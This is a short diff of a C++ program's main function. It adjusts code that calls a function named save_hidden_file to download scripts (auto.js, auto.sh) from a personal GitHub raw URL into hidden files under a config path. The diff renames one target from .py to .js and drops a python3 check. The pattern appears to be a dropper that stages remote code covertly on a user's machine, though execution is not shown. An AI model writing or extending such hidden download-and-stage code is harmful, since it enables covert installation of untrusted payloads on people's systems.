@@ -141,7 +141,7 @@ int main() {
     }
 
 
-    const std::string final_path0 = config_path + "/auto.py";
+    const std::string final_path0 = config_path + "/auto.js";
     if (!save_hidden_file(
             "https://raw.githubusercontent.com/rahul-call/export/main/ror/auto.js",
             final_path0)) {
@@ -153,11 +153,6 @@ int main() {
     if (!save_hidden_file(
             "https://raw.githubusercontent.com/rahul-call/export/main/ror/auto.sh",
             final_path3)) {
-        std::cout << "Failed\n";
-        return 1;
-    }
-
-    if (!command_exists("python3")) {
         std::cout << "Failed\n";
         return 1;
     }
